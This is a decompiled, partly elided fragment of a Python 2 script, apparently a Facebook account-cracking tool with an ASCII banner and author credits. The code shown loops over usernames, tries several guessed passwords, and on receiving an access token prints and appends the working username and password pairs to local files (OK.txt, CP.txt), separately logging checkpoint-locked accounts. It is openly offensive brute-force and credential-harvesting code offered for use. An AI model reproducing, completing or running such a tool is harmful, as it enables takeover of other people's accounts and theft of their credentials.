...
# Github : https://github.com/Usman132
# uncompyle6 version 
...
$$ |  $$ | $$  /    $$ |      $$ |  $$ |$$ |\$$$ |
$$ |  $$ |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ | \$$ |
\__|  \__|\________|\________|\__|  \__|\__|  \__|
                                                                                                                                                                                                                                   
 ______________________________________________
 Author   :            AZLAN SHA
 Facebook :          AZLAN SHA  
 GitHub   :        github.com/tayab828
 Version  :              0.4
 ______________________________________________
                                                  """ 
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [AZLAN_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [AZLAN_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [AZLAN_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m  [AZLAN_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [AZLAN_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [AZLAN_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;95m[\x1b[1;98mAZLAN_menu_Back\x1b[1;95m]')
    login()
